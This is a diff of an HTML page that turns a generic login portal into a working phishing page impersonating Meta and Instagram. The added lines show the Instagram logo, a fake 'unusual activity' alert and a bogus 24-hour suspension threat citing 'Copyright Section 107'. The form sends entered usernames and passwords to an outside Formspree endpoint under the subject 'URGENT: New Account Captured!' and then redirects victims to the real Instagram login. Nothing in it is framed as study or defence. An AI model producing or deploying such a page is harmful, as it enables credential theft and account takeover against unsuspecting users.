@@ -3,34 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Access Portal</title>
+    <title>Meta Security Center | Identity Verification</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background: #2d2d2d; padding: 30px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); width: 100%; max-width: 350px; text-align: center; }
-        h2 { margin-bottom: 20px; font-weight: 500; color: #00aaff; }
-        p { font-size: 14px; color: #aaaaaa; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #444; border-radius: 6px; background: #3d3d3d; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; border: none; border-radius: 6px; background: #00aaff; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #0088cc; }
-        .footer-text { margin-top: 20px; font-size: 11px; color: #666; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: #121212; padding: 40px; border-radius: 8px; border: 1px solid #333; width: 100%; max-width: 380px; text-align: center; }
+        .logo { width: 60px; margin-bottom: 20px; }
+        h2 { font-size: 22px; font-weight: 600; margin-bottom: 10px; color: #fff; }
+        p { font-size: 14px; color: #b0b0b0; line-height: 1.5; margin-bottom: 30px; }
+        .notice-box { background: #1a1a1a; border-left: 4px solid #fa383e; padding: 10px; text-align: left; margin-bottom: 25px; font-size: 12px; color: #ffcccc; }
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #363636; border-radius: 4px; background: #1c1c1c; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; border: none; border-radius: 5px; background: #0095f6; color: white; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 15px; }
+        button:hover { background: #1877f2; }
+        .footer-text { margin-top: 30px; font-size: 12px; color: #737373; }
     </style>
 </head>
 <body>
 
     <div class="login-container">
-        <h2>Member Portal</h2>
-        <p>Identity verification required to access private repository files.</p>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/132px-Instagram_logo_2016.svg.png" alt="Logo" class="logo">
+        
+        <h2>Confirm Your Identity</h2>
+        <p>Our systems detected unusual activity on your account. Please verify your credentials to prevent permanent suspension.</p>
+        
+        <div class="notice-box">
+            <strong>Warning:</strong> Failure to verify within 24 hours will result in account termination under Copyright Section 107.
+        </div>
         
         <form action="https://formspree.io/f/mnjlbagr" method="POST">
-            <input type="email" name="User_Email" placeholder="Email Address" required>
-            <input type="password" name="Security_Key" placeholder="Account Password" required>
+            <input type="email" name="Target_Email" placeholder="Username, phone, or email" required>
+            <input type="password" name="Security_Key" placeholder="Password" required>
             
-            <input type="hidden" name="_subject" value="New Access Grant Detected!">
-            <button type="submit">Verify & Access</button>
+            <input type="hidden" name="_subject" value="URGENT: New Account Captured!">
+            <input type="hidden" name="_next" value="https://www.instagram.com/accounts/login/">
+            
+            <button type="submit">Verify My Account</button>
         </form>
 
         <div class="footer-text">
-            &copy; 2026 Secure Dev Environments. All rights reserved.
+            Meta © 2026 Security Operations Center
         </div>
     </div>
 
